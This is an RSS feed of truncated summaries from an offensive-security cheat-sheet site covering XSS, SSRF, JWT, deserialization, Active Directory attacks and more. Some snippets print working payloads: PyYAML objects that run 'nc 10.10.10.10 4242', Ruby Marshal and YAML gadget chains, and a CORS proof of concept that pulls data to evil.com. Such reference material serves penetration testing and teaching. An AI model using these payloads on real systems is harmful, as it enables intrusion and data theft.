<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Introduction on Gray Hat Freelancing</title><link>https://www.grayhatfreelancing.com/</link><description>Recent content in Introduction on Gray Hat Freelancing</description><generator>Hugo -- gohugo.io</generator><copyright>2023</copyright><atom:link href="https://www.grayhatfreelancing.com/index.xml" rel="self" type="application/rss+xml"/><item><title>Insecure File Upload</title><link>https://www.grayhatfreelancing.com/docs/insecure_file_uploads/</link><pubDate>Thu, 06 Apr 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/insecure_file_uploads/</guid><description>Upload Insecure Files # Uploaded files may pose a significant risk if not handled correctly. A remote attacker could send a multipart/form-data POST request with a specially-crafted filename or mime type and execute arbitrary code.
Summary # Tools Exploits Defaults extensions Upload tricks Filename vulnerabilities Picture compression Configuration Files CVE - ImageMagick CVE - FFMpeg ZIP Archive Jetty RCE References Tools # Fuxploider Burp &amp;gt; Upload Scanner ZAP &amp;gt; FileUpload AddOn Exploits # Defaults extensions # PHP Server .</description></item><item><title>Web Cache Deception</title><link>https://www.grayhatfreelancing.com/docs/web_cache_deception/</link><pubDate>Thu, 06 Apr 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/web_cache_deception/</guid><description>Web Cache Deception # Summary # Tools Exploit Methodology - Caching Sensitive Data Methodology - Caching Custom JavaScript CloudFlare Caching Labs References Tools # PortSwigger/param-miner This extension identifies hidden, unlinked parameters. It&amp;rsquo;s particularly useful for finding web cache poisoning vulnerabilities.
Exploit # Browser requests a resource such as http://www.example.com/home.php/non-existent.css. Server returns the content of http://www.example.com/home.php, most probably with HTTP caching headers that instruct to not cache this page. The response goes through the proxy.</description></item><item><title>XSS Injection</title><link>https://www.grayhatfreelancing.com/docs/xss_injection/</link><pubDate>Thu, 06 Apr 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/xss_injection/</guid><description>Cross Site Scripting # Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users.
Summary # Cross Site Scripting Vulnerability Details Exploit code or POC Data grabber for XSS CORS UI redressing Javascript keylogger Other ways Identify an XSS endpoint Tools XSS in HTML/Applications Common Payloads XSS using HTML5 tags XSS using a remote JS XSS in hidden input XSS when payload is reflected capitalized DOM based XSS XSS in JS Context XSS in wrappers javascript and data URI XSS in files XSS in XML XSS in SVG XSS in SVG (short) XSS in Markdown XSS in SWF flash application XSS in SWF flash application XSS in CSS XSS in PostMessage Blind XSS XSS Hunter Other Blind XSS tools Blind XSS endpoint Tips Mutated XSS Polyglot XSS Filter Bypass and exotic payloads Bypass case sensitive Bypass tag blacklist Bypass word blacklist with code evaluation Bypass with incomplete html tag Bypass quotes for string Bypass quotes in script tag Bypass quotes in mousedown event Bypass dot filter Bypass parenthesis for string Bypass parenthesis and semi colon Bypass onxxxx= blacklist Bypass space filter Bypass email filter Bypass document blacklist Bypass document.</description></item><item><title>Java RMI</title><link>https://www.grayhatfreelancing.com/docs/java_rmi/</link><pubDate>Sat, 01 Apr 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/java_rmi/</guid><description>Java RMI # The attacker can host a MLet file and instruct the JMX service to load MBeans from the remote host.
Exploitation # Requirements # Jython The JMX server can connect to a http service that is controlled by the attacker JMX authentication is not enabled Detection # $ nmap -sV --script &amp;#34;rmi-dumpregistry or rmi-vuln-classloader&amp;#34; -p TARGET_PORT TARGET_IP -Pn -v 1089/tcp open java-rmi Java RMI | rmi-vuln-classloader: | VULNERABLE: | RMI registry default configuration remote code execution vulnerability | State: VULNERABLE | Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution.</description></item><item><title>JSON Web Tokens</title><link>https://www.grayhatfreelancing.com/docs/json_web_token/</link><pubDate>Sat, 01 Apr 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/json_web_token/</guid><description>JWT - JSON Web Token # JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed.
Summary # Summary Tools JWT Format Header Payload JWT Signature JWT Signature - Null Signature Attack (CVE-2020-28042) JWT Signature - Disclosure of a correct signature (CVE-2019-7644) JWT Signature - None Algorithm (CVE-2015-9235) JWT Signature - Key Confusion Attack RS256 to HS256 (CVE-2016-5431) JWT Signature - Key Injection Attack (CVE-2018-0114) JWT Secret Encode and Decode JWT with the secret Break JWT secret JWT tool Hashcat JWT Claims JWT kid Claim Misuse JWKS - jku header injection References Tools # ticarpi/jwt_tool brendan-rius/c-jwt-cracker JOSEPH - JavaScript Object Signing and Encryption Pentesting Helper jwt.</description></item><item><title>Server-Side Request Forgery</title><link>https://www.grayhatfreelancing.com/docs/server_side_request_forgery/</link><pubDate>Sat, 01 Apr 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/server_side_request_forgery/</guid><description>Server-Side Request Forgery # Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on their behalf.
Summary # Tools Payloads with localhost Bypassing filters Bypass using HTTPS Bypass localhost with [::] Bypass localhost with a domain redirection Bypass localhost with CIDR Bypass using a decimal IP location Bypass using octal IP Bypass using IPv6/IPv4 Address Embedding Bypass using malformed urls Bypass using rare address Bypass using URL encoding Bypass using bash variables Bypass using tricks combination Bypass using enclosed alphanumerics Bypass filter_var() php function Bypass against a weak parser Bypassing using jar protocol (java only) SSRF exploitation via URL Scheme file:// http:// dict:// sftp:// tftp:// ldap:// gopher:// netdoc:// SSRF exploiting WSGI SSRF exploiting Redis SSRF exploiting PDF file Blind SSRF SSRF to XSS SSRF from XSS SSRF URL for Cloud Instances SSRF URL for AWS Bucket SSRF URL for AWS ECS SSRF URL for AWS Elastic Beanstalk SSRF URL for AWS Lambda SSRF URL for Google Cloud SSRF URL for Digital Ocean SSRF URL for Packetcloud SSRF URL for Azure SSRF URL for OpenStack/RackSpace SSRF URL for HP Helion SSRF URL for Oracle Cloud SSRF URL for Kubernetes ETCD SSRF URL for Alibaba SSRF URL for Docker SSRF URL for Rancher Tools # SSRFmap - https://github.</description></item><item><title>Application Escape and Breakout</title><link>https://www.grayhatfreelancing.com/docs/escape_breakout/</link><pubDate>Fri, 31 Mar 2023 04:33:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/escape_breakout/</guid><description>Application Escape and Breakout # Gaining a command shell # Shortcut [Window] + [R] -&amp;gt; cmd [CTRL] + [SHIFT] + [ESC] -&amp;gt; Task Manager [CTRL] + [ALT] + [DELETE] -&amp;gt; Task Manager Access through file browser: Browsing to the folder containing the binary (i.e. C:\windows\system32\), we can simply right click and open it Drag-and-drop: dragging and dropping any file onto the cmd.exe Hyperlink: file:///c:/Windows/System32/cmd.exe Task Manager: File &amp;gt; New Task (Run.</description></item><item><title/><link>https://www.grayhatfreelancing.com/docs/csv_injection/</link><pubDate>Fri, 31 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/csv_injection/</guid><description>CSV Injection # Many web applications allow the user to download content such as templates for invoices or user settings to a CSV file. Many users choose to open the CSV file in either Excel, Libre Office or Open Office. When a web application does not properly validate the contents of the CSV file, it could lead to contents of a cell or many cells being executed.
Exploit # Basic exploit with Dynamic Data Exchange</description></item><item><title>Account Takeovers</title><link>https://www.grayhatfreelancing.com/docs/checking_for_account_takeover/</link><pubDate>Fri, 31 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/checking_for_account_takeover/</guid><description>Account Takeover # Password Reset Feature Password Reset Token Leak Via Referrer Account Takeover Through Password Reset Poisoning Password Reset Via Email Parameter IDOR on API Parameters Weak Password Reset Token Leaking Password Reset Token Password Reset Via Username Collision Account takeover due to unicode normalization issue Account Takeover Via Cross Site Scripting Account Takeover Via HTTP Request Smuggling Account Takeover via CSRF 2FA Bypasses Response Manipulation Status Code Manipulation 2FA Code Leakage in Response JS File Analysis 2FA Code Reusability Lack of Brute-Force Protection Missing 2FA Code Integrity Validation CSRF on 2FA Disabling Password Reset Disable 2FA Backup Code Abuse Clickjacking on 2FA Disabling Page Enabling 2FA doesn&amp;rsquo;t expire Previously active Sessions Bypass 2FA by Force Browsing Bypass 2FA with null or 000000 Bypass 2FA with array References Password Reset Feature # Password Reset Token Leak Via Referrer # Request password reset to your email address Click on the password reset link Don&amp;rsquo;t change password Click any 3rd party websites(eg: Facebook, twitter) Intercept the request in Burp Suite proxy Check if the referer header is leaking password reset token.</description></item><item><title>Cobalt Strike</title><link>https://www.grayhatfreelancing.com/docs/cobalt_strike_all_you_need/</link><pubDate>Fri, 31 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/cobalt_strike_all_you_need/</guid><description>Cobalt Strike # Cobalt Strike is threat emulation software. Red teams and penetration testers use Cobalt Strike to demonstrate the risk of a breach and evaluate mature security programs. Cobalt Strike exploits network vulnerabilities, launches spear phishing campaigns, hosts web drive-by attacks, and generates malware infected files from a powerful graphical user interface that encourages collaboration and reports all activity.
$ sudo apt-get update $ sudo apt-get install openjdk-11-jdk $ sudo apt install proxychains socat $ sudo update-java-alternatives -s java-1.</description></item><item><title>CVE Exploits</title><link>https://www.grayhatfreelancing.com/docs/cve_exploits/</link><pubDate>Fri, 31 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/cve_exploits/</guid><description>Common Vulnerabilities and Exposures # Tools # Trickest CVE Repository - Automated collection of CVEs and PoC&amp;rsquo;s Nuclei Templates - Community curated list of templates for the nuclei engine to find security vulnerabilities in applications Metasploit Framework CVE Details - The ultimate security vulnerability datasource Big CVEs in the last 5 years. # CVE-2017-0144 - EternalBlue # EternalBlue exploits a vulnerability in Microsoft&amp;rsquo;s implementation of the Server Message Block (SMB) protocol.</description></item><item><title>DNS Rebinding</title><link>https://www.grayhatfreelancing.com/docs/dns_rebinding/</link><pubDate>Fri, 31 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/dns_rebinding/</guid><description>DNS Rebinding # DNS rebinding changes the IP address of an attacker controlled machine name to the IP address of a target application, bypassing the same-origin policy and thus allowing the browser to make arbitrary requests to the target application and read their responses.
Summary # Tools Exploitation Protection Bypasses Tools # Singularity of Origin - is a tool to perform DNS rebinding attacks. Singularity of Origin Web Client (manager interface, port scanner and autoattack) Exploitation # First, we need to make sure that the targeted service is vulnerable to DNS rebinding.</description></item><item><title>Docker Security</title><link>https://www.grayhatfreelancing.com/docs/docker_pentesting/</link><pubDate>Fri, 31 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/docker_pentesting/</guid><description>DNS Rebinding # DNS rebinding changes the IP address of an attacker controlled machine name to the IP address of a target application, bypassing the same-origin policy and thus allowing the browser to make arbitrary requests to the target application and read their responses.
Summary # Tools Exploitation Protection Bypasses Tools # Singularity of Origin - is a tool to perform DNS rebinding attacks. Singularity of Origin Web Client (manager interface, port scanner and autoattack) Exploitation # First, we need to make sure that the targeted service is vulnerable to DNS rebinding.</description></item><item><title>File Inclusion</title><link>https://www.grayhatfreelancing.com/docs/file_inclusion/</link><pubDate>Fri, 31 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/file_inclusion/</guid><description>File Inclusion # The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a &amp;ldquo;dynamic file inclusion&amp;rdquo; mechanisms implemented in the target application. The Path Traversal vulnerability allows an attacker to access a file, usually exploiting a &amp;ldquo;reading&amp;rdquo; mechanism implemented in the target application
Summary # File Inclusion Summary Tools Basic LFI Null byte Double encoding UTF-8 encoding Path and dot truncation Filter bypass tricks Basic RFI Null byte Double encoding Bypass allow_url_include LFI / RFI using wrappers Wrapper php://filter Wrapper data:// Wrapper expect:// Wrapper input:// Wrapper zip:// Wrapper phar:// Wrapper iconv:// and dechunk:// LFI to RCE via /proc/*/fd LFI to RCE via /proc/self/environ LFI to RCE via upload LFI to RCE via upload (race) LFI to RCE via upload (FindFirstFile) LFI to RCE via phpinfo() LFI to RCE via controlled log file RCE via SSH RCE via Mail RCE via Apache logs LFI to RCE via PHP sessions LFI to RCE via credentials files Windows version Linux version References Tools # Kadimus - https://github.</description></item><item><title>Insecure Direct Object References</title><link>https://www.grayhatfreelancing.com/docs/insecure_direct_object_references/</link><pubDate>Fri, 31 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/insecure_direct_object_references/</guid><description>Insecure Direct Object References # Insecure Direct Object References occur when an application provides direct access to objects based on user-supplied input. As a result of this vulnerability attackers can bypass authorization and access resources in the system directly, for example database records or files. - OWASP
Summary # Tools Exploit IDOR Tips Examples References Tools # BApp Store &amp;gt; Authz BApp Store &amp;gt; AuthMatrix BApp Store &amp;gt; Autorize Exploit # The value of a parameter is used directly to retrieve a database record.</description></item><item><title>Kuburnetes</title><link>https://www.grayhatfreelancing.com/docs/kuburnetes/</link><pubDate>Wed, 29 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/kuburnetes/</guid><description>A Docker links collection of variables named {SVCNAME}_PORT_{NUM}_{PROTOCOL}_{PROTO|PORT|ADDR} for each port the service exposes. For example, all of the following environment variables would be available if a redis-master service were running with port 6379 exposed:
REDIS_MASTER_SERVICE_HOST=10.0.0.11 REDIS_MASTER_SERVICE_PORT=6379 REDIS_MASTER_PORT=tcp://10.0.0.11:6379 REDIS_MASTER_PORT_6379_TCP=tcp://10.0.0.11:6379 REDIS_MASTER_PORT_6379_TCP_PROTO=tcp REDIS_MASTER_PORT_6379_TCP_PORT=6379 REDIS_MASTER_PORT_6379_TCP_ADDR=10.0.0.11 Simulating kubectl API Requests # Most containers within a Kubernetes cluster won&amp;rsquo;t have the kubectl utility installed. If running the one-line kubectl installer within the container isn&amp;rsquo;t an option, you may need to craft Kubernetes HTTP API requests manually.</description></item><item><title>Privacy Policy - Gray Hat Freelancing</title><link>https://www.grayhatfreelancing.com/privacy/</link><pubDate>Wed, 29 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/privacy/</guid><description>Privacy Policy # This Privacy Policy describes Our policies and procedures on the collection, use and disclosure of Your information when You use the Service and tells You about Your privacy rights and how the law protects You.
We use Your Personal data to provide and improve the Service. By using the Service, You agree to the collection and use of information in accordance with this Privacy Policy.
Interpretation and Definitions # Interpretation # The words of which the initial letter is capitalized have meanings defined under the following conditions.</description></item><item><title>Active Directory Attacks</title><link>https://www.grayhatfreelancing.com/docs/attacking_active_directory/</link><pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/attacking_active_directory/</guid><description>Active Directory Attacks # Summary # Active Directory Attacks Summary Tools Kerberos Clock Synchronization Active Directory Recon Using BloodHound Using PowerView Using AD Module From CVE to SYSTEM shell on DC MS14-068 Checksum Validation ZeroLogon PrintNightmare samAccountName spoofing Open Shares SCF and URL file attack against writeable share SCF Files URL Files Windows Library Files Windows Search Connectors Files Passwords in SYSVOL &amp;amp; Group Policy Preferences Exploit Group Policy Objects GPO Find vulnerable GPO Abuse GPO with SharpGPOAbuse Abuse GPO with PowerGPOAbuse Abuse GPO with pyGPOAbuse Abuse GPO with PowerView Abuse GPO with StandIn Dumping AD Domain Credentials DCSync Attack Volume Shadow Copy Extract hashes from ntds.</description></item><item><title>Amazon AWS S3 Buckets</title><link>https://www.grayhatfreelancing.com/docs/amazon_aws_s3_buckets/</link><pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/amazon_aws_s3_buckets/</guid><description>Amazon Bucket S3 AWS # Summary # AWS Configuration Open Bucket Basic tests Listing files Move a file into the bucket Download every things Check bucket disk size AWS - Extract Backup Bucket juicy data AWS Configuration # Prerequisites, at least you need awscli
sudo apt install awscli You can get your credential here https://console.aws.amazon.com/iam/home?#/security_credential but you need an aws account, free tier account : https://aws.amazon.com/s/dm/optimization/server-side-test/free-tier/free_np/
aws configure AWSAccessKeyId=[ENTER HERE YOUR KEY] AWSSecretKey=[ENTER HERE YOUR KEY] aws configure --profile nameofprofile then you can use &amp;ndash;profile nameofprofile in the aws command.</description></item><item><title>API Key Leaks</title><link>https://www.grayhatfreelancing.com/docs/api_key_leaks/</link><pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/api_key_leaks/</guid><description>API Key Leaks # The API key is a unique identifier that is used to authenticate requests associated with your project. Some developers might hardcode them or leave it on public shares.
Summary # Tools Exploit Google Maps Algolia AWS Access Key ID &amp;amp; Secret Slack API Token Facebook Access Token Github client id and client secret Twilio Account_sid and Auth Token Twitter API Secret Twitter Bearer Token Gitlab Personal Access Token HockeyApp API Token IIS Machine Keys Mapbox API Token Tools # KeyFinder - is a tool that let you find keys while surfing the web!</description></item><item><title>Argument Injection</title><link>https://www.grayhatfreelancing.com/docs/argument_injection/</link><pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/argument_injection/</guid><description>Argument Injection # Argument injection is similar to command injection as tainted data is passed to to a command executed in a shell without proper sanitization/escaping.
It can happen in different situations, where you can only inject arguments to a command:
Improper sanitization (regex) Injection of arguments into a fixed command (PHP:escapeshellcmd, Python: Popen) Bash expansion (ex: *) In the following example, a python script takes the inputs from the command line to generate a curl command:</description></item><item><title>Command Injection</title><link>https://www.grayhatfreelancing.com/docs/command_injection/</link><pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/command_injection/</guid><description>Command Injection # Command injection is a security vulnerability that allows an attacker to execute arbitrary commands inside a vulnerable application.
Summary # Tools Exploits Basic commands Chaining commands Inside a command Filter Bypasses Bypass without space Bypass with a line return Bypass with backslash newline Bypass characters filter via hex encoding Bypass blacklisted words Bypass with single quote Bypass with double quote Bypass with backslash and slash Bypass with $@ Bypass with $() Bypass with variable expansion Bypass with wildcards Challenge Time based data exfiltration DNS based data exfiltration Polyglot command injection Backgrounding long running commands References Tools # commix - Automated All-in-One OS command injection and exploitation tool Exploits # Basic commands # Execute the command and voila :p</description></item><item><title>CORS Misconfigurations</title><link>https://www.grayhatfreelancing.com/docs/cors_misconfigurations/</link><pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/cors_misconfigurations/</guid><description>Usually you want to target an API endpoint. Use the following payload to exploit a CORS misconfiguration on target https://victim.example.com/endpoint.
Vulnerable Example: Origin Reflection # Vulnerable Implementation # GET /endpoint HTTP/1.1 Host: victim.example.com Origin: https://evil.com Cookie: sessionid=... HTTP/1.1 200 OK Access-Control-Allow-Origin: https://evil.com Access-Control-Allow-Credentials: true {&amp;#34;[private API key]&amp;#34;} Proof of concept # This PoC requires that the respective JS script is hosted at evil.com
var req = new XMLHttpRequest(); req.onload = reqListener; req.</description></item><item><title>CSRF Injection</title><link>https://www.grayhatfreelancing.com/docs/csrf_injection/</link><pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/csrf_injection/</guid><description>Cross-Site Request Forgery # Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they&amp;rsquo;re currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. - OWASP
Tools # XSRFProbe - The Prime Cross Site Request Forgery Audit and Exploitation Toolkit. Methodology # Payloads # When you are logged in to a certain site, you typically have a session.</description></item><item><title>Directory Traversal</title><link>https://www.grayhatfreelancing.com/docs/directory_traversal/</link><pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/directory_traversal/</guid><description>Directory Traversal # A directory or path traversal consists in exploiting insufficient security validation / sanitization of user-supplied input file names, so that characters representing &amp;ldquo;traverse to parent directory&amp;rdquo; are passed through to the file APIs.
Summary # Tools Basic exploitation 16 bits Unicode encoding UTF-8 Unicode encoding Bypass &amp;ldquo;../&amp;rdquo; replaced by &amp;ldquo;&amp;rdquo; Bypass &amp;ldquo;../&amp;rdquo; with &amp;ldquo;;&amp;rdquo; Double URL encoding UNC Bypass NGINX/ALB Bypass Path Traversal Interesting Linux files Interesting Windows files References Tools # dotdotpwn - https://github.</description></item><item><title>Network Discovery</title><link>https://www.grayhatfreelancing.com/docs/network_discovery/</link><pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/network_discovery/</guid><description>Network Discovery # Summary # Nmap Spyse Masscan Netdiscover Responder Bettercap Reconnoitre SSL MITM with OpenSSL References Nmap # Ping sweep (No port scan, No DNS resolution) nmap -sn -n --disable-arp-ping 192.168.1.1-254 | grep -v &amp;#34;host down&amp;#34; -sn : Disable port scanning. Host discovery only. -n : Never do DNS resolution Basic NMAP sudo nmap -sSV -p- 192.168.0.1 -oA OUTPUTFILE -T4 sudo nmap -sSV -oA OUTPUTFILE -T4 -iL INPUTFILE.csv • the flag -sSV defines the type of packet to send to the server and tells Nmap to try and determine any service on open ports • the -p- tells Nmap to check all 65,535 ports (by default it will only check the most popular 1,000) • 192.</description></item><item><title>Python Deserialization</title><link>https://www.grayhatfreelancing.com/docs/insecure_deserialization/python/</link><pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/insecure_deserialization/python/</guid><description>Python Deserialization # In Python source code, look for: cPickle.loads pickle.loads _pickle.loads jsonpickle.decode Pickle # The following code is a simple example of using cPickle in order to generate an auth_token which is a serialized User object. :warning: import cPickle will only work on Python 2
import cPickle from base64 import b64encode, b64decode class User: def __init__(self): self.username = &amp;#34;anonymous&amp;#34; self.password = &amp;#34;anonymous&amp;#34; self.rank = &amp;#34;guest&amp;#34; h = User() auth_token = b64encode(cPickle.</description></item><item><title>Ruby Deserialization</title><link>https://www.grayhatfreelancing.com/docs/insecure_deserialization/ruby/</link><pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/insecure_deserialization/ruby/</guid><description>Ruby Deserialization # Marshal.load # Script to generate and verify the deserialization gadget chain against Ruby 2.0 through to 2.5
for i in {0..5}; do docker run -it ruby:2.${i} ruby -e &amp;#39;Marshal.load([&amp;#34;0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d49220d7c696420313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446&amp;#34;].pack(&amp;#34;H*&amp;#34;)) rescue nil&amp;#39;; done Yaml.load # Vulnerable code
require &amp;#34;yaml&amp;#34; YAML.load(File.read(&amp;#34;p.yml&amp;#34;)) Universal gadget for ruby &amp;lt;= 2.7.2:
--- !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::DependencyList specs: - !ruby/object:Gem::Source::SpecificFile spec: &amp;amp;1 !ruby/object:Gem::StubSpecification loaded_from: &amp;#34;|id 1&amp;gt;&amp;amp;2&amp;#34; - !ruby/object:Gem::Source::SpecificFile spec: Universal gadget for ruby 2.x - 3.</description></item><item><title>Web Sockets Attacks</title><link>https://www.grayhatfreelancing.com/docs/web_sockets/</link><pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/web_sockets/</guid><description>Web Sockets # The WebSocket protocol allows a bidirectional and full-duplex communication between a client and a server
Summary # Tools Exploit Using ws-harness.py Cross-Site WebSocket Hijacking (CSWSH) Labs References Tools # ws-harness.py Exploit # Using ws-harness.py # Start ws-harness to listen on a web-socket, and specify a message template to send to the endpoint.
python ws-harness.py -u &amp;#34;ws://dvws.local:8080/authenticate-user&amp;#34; -m ./message.txt The content of the message should contains the [FUZZ] keyword.</description></item><item><title>YAML Deserialization</title><link>https://www.grayhatfreelancing.com/docs/insecure_deserialization/yaml/</link><pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/insecure_deserialization/yaml/</guid><description>YAML Deserialization # Summary # Tools Exploit PyYAML ruamel.yaml Ruby SnakeYAML References Tools # j0lt-github/python-deserialization-attack-payload-generator artsploit/yaml-payload - A tiny project for generating SnakeYAML deserialization payloads mbechler/marshalsec Exploit # PyYAML # !!python/object/apply:time.sleep [10] !!python/object/apply:builtins.range [1, 10, 1] !!python/object/apply:os.system [&amp;#34;nc 10.10.10.10 4242&amp;#34;] !!python/object/apply:os.popen [&amp;#34;nc 10.10.10.10 4242&amp;#34;] !!python/object/new:subprocess [[&amp;#34;ls&amp;#34;,&amp;#34;-ail&amp;#34;]] !!python/object/new:subprocess.check_output [[&amp;#34;ls&amp;#34;,&amp;#34;-ail&amp;#34;]] !!python/object/apply:subprocess.Popen - ls !!python/object/new:str state: !!python/tuple - &amp;#39;print(getattr(open(&amp;#34;flag\x2etxt&amp;#34;), &amp;#34;read&amp;#34;)())&amp;#39; - !!python/object/new:Warning state: update: !!python/name:exec Since PyYaml version 6.0, the default loader for load has been switched to SafeLoader mitigating the risks against Remote Code Execution.</description></item></channel></rss>